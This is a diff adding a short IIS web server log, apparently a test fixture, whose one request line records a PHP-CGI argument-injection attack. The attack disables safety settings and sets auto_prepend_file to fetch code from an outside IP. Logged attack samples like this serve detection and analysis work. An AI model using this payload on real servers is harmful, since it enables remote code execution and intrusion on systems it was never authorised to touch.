@@ -1,0 +1,5 @@
+#Software: Microsoft Internet Information Services 6.0
+#Version: 1.0
+#Date: 2013-10-08 03:31:13
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status 
+2013-10-08 03:31:13 W3SVC60 208.123.218.206 GET /login.php -dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2F61.19.253.26%2Fecho.txt 80 - 90.148.48.74 Mozilla/5.0+(Windows+NT+6.1;+WOW64;+rv:23.0)+Gecko/20100101+Firefox/23.0 200 0 0
